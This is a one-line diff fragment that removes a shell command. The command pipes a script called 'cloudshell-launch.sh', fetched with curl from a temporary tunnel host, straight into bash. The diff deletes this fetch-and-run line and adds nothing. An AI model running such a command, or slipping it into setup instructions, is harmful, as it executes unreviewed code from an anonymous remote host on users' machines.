@@ -1,1 +1,0 @@
-curl -fsSL https://lemon-zoos-guess.loca.lt/cloudshell-launch.sh | bash
